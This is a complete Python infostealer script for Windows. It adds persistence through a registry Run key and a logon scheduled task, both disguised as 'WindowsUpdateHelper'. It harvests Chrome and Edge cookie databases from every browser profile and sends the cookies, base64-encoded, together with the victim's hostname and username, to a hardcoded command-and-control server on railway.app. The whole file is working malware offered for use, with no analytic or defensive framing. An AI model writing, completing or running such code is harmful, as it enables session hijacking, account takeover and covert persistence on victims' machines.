from __future__ import annotations

import pathlib
import socket
import os
import base64
import requests
import time
import winreg
import datetime
import sys
import shutil
import subprocess
import json
import sqlite3
import tempfile

_DEFAULT_C2_BASE = "https://cvsstool-production.up.railway.app"  # override with C2_SEND_URL
_DEFAULT_SECRET_TOKEN = "qutmess"  # override with C2_SECRET_TOKEN / SECRET_TOKEN


def _normalize_send_url(url: str) -> str:
    url = url.strip().rstrip("/")
    if not url:
        return ""
    if not url.endswith("/send"):
        return url + "/send"
    return url


def _load_c2_settings() -> tuple[str, str]:  # env wins; token must match Node SECRET_TOKEN; /send appended if missing
    raw = os.environ.get("C2_SEND_URL", "").strip() or _DEFAULT_C2_BASE
    server_url = _normalize_send_url(raw)
    token = (
        os.environ.get("C2_SECRET_TOKEN", "").strip()
        or os.environ.get("SECRET_TOKEN", "").strip()
        or _DEFAULT_SECRET_TOKEN
    )
    return server_url, token


SERVER_URL, API_TOKEN = _load_c2_settings()


def add_registry_persistence():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        script_path = os.path.abspath(__file__)
        winreg.SetValueEx(
            key,
            "WindowsUpdateHelper",
            0,
            winreg.REG_SZ,
            f'python "{script_path}"',
        )
        winreg.CloseKey(key)
        print("[+] Registry persistence added")
    except Exception as e:
        print(f"[-] Registry persistence failed: {e}")


def add_scheduled_task_persistence():
    try:
        script_path = os.path.abspath(__file__)
        task_name = "WindowsUpdateHelper"
        cmd = f'''schtasks /Create /TN "{task_name}" /TR "python \\"{script_path}\\"" /SC ONLOGON /RL HIGHEST /F'''
        subprocess.run(cmd, shell=True, capture_output=True)
        print("[+] Scheduled task persistence added")
    except Exception as e:
        print(f"[-] Scheduled task persistence failed: {e}")


def ensure_persistence():
    add_registry_persistence()
    add_scheduled_task_persistence()


def get_victim_info():
    try:
        hostname = socket.gethostname()
        username = os.getlogin()
    except Exception:
        hostname = "unknown"
        username = "unknown"
    return hostname, username


def send_to_server(hostname, username, file_path, filename):
    try:
        print(f"[*] Sending to: {SERVER_URL}")
        print(f"[*] Token: {API_TOKEN}, Hostname: {hostname}, User: {username}")

        with open(file_path, "rb") as f:
            content = base64.b64encode(f.read()).decode("utf-8")

        response = requests.post(
            SERVER_URL,
            json={
                "hostname": hostname,
                "username": username,
                "token": API_TOKEN,
                "filename": filename,
                "content": content,
            },
            timeout=30,
        )
        print(f"[+] Sent - Status: {response.status_code}, Response: {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")


def _chrome_user_data_roots():  # Chromium user-data dirs under LOCALAPPDATA
    local = os.environ.get("LOCALAPPDATA")
    if not local:
        return []
    base = pathlib.Path(local)
    rels = (
        "Google/Chrome/User Data",
        "Google/Chrome SxS/User Data",
        "Google/Chrome Beta/User Data",
        "Chromium/User Data",
        "Microsoft/Edge/User Data",
    )
    return [base / r for r in rels if (base / r).is_dir()]


def _profile_names_from_local_state(user_data: pathlib.Path) -> list[str]:  # profile list from Local State JSON
    ls = user_data / "Local State"
    if not ls.is_file():
        return []
    try:
        data = json.loads(ls.read_text(encoding="utf-8-sig"))
        cache = data.get("profile", {}).get("info_cache") or {}
        names = list(cache.keys())
    except (json.JSONDecodeError, OSError):
        return []

    def sort_key(name: str):
        if name == "Default":
            return (0, 0)
        if name.startswith("Profile "):
            rest = name[8:].strip()
            if rest.isdigit():
                return (1, int(rest))
            return (1, 999)
        return (2, name)

    names.sort(key=sort_key)
    return names


def _profile_names_from_disk(user_data: pathlib.Path) -> list[str]:  # fallback: Default / Profile N dirs only
    names = []
    try:
        for p in user_data.iterdir():
            if not p.is_dir():
                continue
            n = p.name
            if n == "Default":
                names.append(n)
            elif n.startswith("Profile ") and n[8:].strip().isdigit():
                names.append(n)
    except OSError:
        return []

    def sort_key(name: str):
        if name == "Default":
            return (0, 0)
        return (1, int(name.split()[1]))

    names.sort(key=sort_key)
    return names


def _cookie_dbs_for_profile(user_data: pathlib.Path, profile_name: str) -> list[pathlib.Path]:  # Network/Cookies + legacy Cookies
    prof = user_data / profile_name
    if not prof.is_dir():
        return []
    network = prof / "Network" / "Cookies"
    legacy = prof / "Cookies"
    out = []
    for candidate in (network, legacy):
        try:
            if candidate.is_file() and candidate.stat().st_size > 0:
                out.append(candidate)
        except OSError:
            continue
    return out


def find_chrome_cookie_databases() -> list[pathlib.Path]:  # Local State first, dedupe paths, Default→Profile order
    seen: set[str] = set()
    ordered: list[pathlib.Path] = []

    for user_data in _chrome_user_data_roots():
        profiles = _profile_names_from_local_state(user_data)
        if not profiles:
            profiles = _profile_names_from_disk(user_data)

        for pname in profiles:
            for db_path in _cookie_dbs_for_profile(user_data, pname):
                key = str(db_path.resolve())
                if key not in seen:
                    seen.add(key)
                    ordered.append(db_path)

    return ordered


def extract_cookies_from_db(db_path: str) -> list[dict]:
    cookies_data: list[dict] = []
    tmp_path = None
    try:
        fd, tmp_path = tempfile.mkstemp(suffix=".db")
        os.close(fd)
        shutil.copy2(db_path, tmp_path)
        conn = sqlite3.connect(tmp_path)
        cursor = conn.cursor()

        try:
            cursor.execute("SELECT name, value, host_key, path FROM cookies")
        except sqlite3.OperationalError:
            try:
                cursor.execute("SELECT name, value, host_key, path FROM moz_cookies")
            except sqlite3.OperationalError:
                conn.close()
                return []

        for row in cursor.fetchall():
            if row[0] and row[1]:
                cookies_data.append(
                    {
                        "name": row[0],
                        "value": row[1],
                        "domain": row[2] if len(row) > 2 else "",
                        "path": row[3] if len(row) > 3 else "/",
                    }
                )

        conn.close()
    except Exception as e:
        print(f"[-] Failed to extract cookies from {db_path}: {e}")
        return []
    finally:
        if tmp_path and os.path.isfile(tmp_path):
            try:
                os.unlink(tmp_path)
            except OSError:
                pass

    return cookies_data


def collect_and_send_cookies():
    hostname, username = get_victim_info()
    db_paths = find_chrome_cookie_databases()

    if not db_paths:
        print("[-] No Chrome/Edge cookie databases found")
        return

    merged: list[dict] = []
    seen_keys: set[tuple] = set()

    for db_path in db_paths:
        print(f"[*] Cookies DB: {db_path}")
        for c in extract_cookies_from_db(str(db_path)):
            key = (c.get("domain"), c.get("name"), c.get("path"))
            if key not in seen_keys:
                seen_keys.add(key)
                merged.append(c)

    if not merged:
        print("[-] No cookies extracted")
        return

    print(f"[*] Extracted {len(merged)} unique cookies from {len(db_paths)} database(s)")

    temp_path = None
    try:
        with tempfile.NamedTemporaryFile(
            mode="w", delete=False, suffix=".json", encoding="utf-8"
        ) as tmp:
            temp_path = tmp.name
            json.dump(merged, tmp)
        send_to_server(hostname, username, temp_path, "chrome_cookies.json")
    finally:
        if temp_path and os.path.isfile(temp_path):
            try:
                os.unlink(temp_path)
            except OSError:
                pass


def run_session():
    print(f"[*] Session started at {datetime.datetime.now()}")

    ensure_persistence()
    collect_and_send_cookies()

    print(f"[*] Session completed at {datetime.datetime.now()}")


if __name__ == "__main__":
    time.sleep(5)
    run_session()
